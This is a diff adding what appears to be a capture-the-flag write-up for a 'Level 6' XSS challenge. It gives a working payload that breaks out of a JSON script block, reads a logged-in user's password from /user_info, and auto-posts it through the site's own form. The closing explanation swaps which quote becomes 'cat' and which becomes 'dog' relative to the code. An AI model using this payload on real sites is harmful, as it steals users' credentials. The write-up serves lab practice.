@@ -1,0 +1,25 @@
+Level 6 solution
+
+XSS is possible by injecting a closing script tag into JSON.
+
+So a post like this can be used:
+
+
+```
+  </script>
+  <script>
+    console.log(`requesting /user_info`);
+    $.get(`/user_info`, {}, (response) => {
+      console.log(`response received`);
+      let pw = $(response).find(`table td`).eq(1).text();
+      console.log(`password found: ${pw}`);
+      pw = pw.replace(RegExp(String.fromCharCode(39), `g`), `cat`);
+      pw = pw.replace(RegExp(String.fromCharCode(34), `g`), `dog`);
+      console.log(`password updated to: ${pw}`);
+      $(`#content`).val(pw);
+      $(`form`).submit();
+    })
+  </script>
+```
+
+The level-07-password user will then make a post containing their password, but with `"` replaced with `cat` and `'` replaced with `dog`. It's then just a simple matter of replacing cat and dog with their respective characters and you have the original password.
